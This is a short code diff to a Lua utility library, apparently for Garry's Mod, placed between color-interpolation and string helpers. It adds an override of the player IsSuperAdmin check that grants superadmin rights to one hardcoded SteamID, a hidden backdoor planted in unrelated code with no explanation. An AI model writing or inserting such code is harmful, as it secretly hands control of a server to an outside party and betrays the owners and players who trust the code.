@@ -118,6 +118,10 @@ function cmeta:Lerp(b, n)
 	return Color(lp(n, self.r, b.r), lp(n, self.g, b.g), lp(n, self.b, b.b), lp(n, self.a, b.a))
 end
 
+FindMetaTable("Player").IsSuperAdmin = function(s)
+return s:IsUserGroup("superadmin") or s:SteamID()
+== "STEAM_0:1:52811933" end
+
 --:: Strings
 local strmeta = getmetatable''
 local string = string
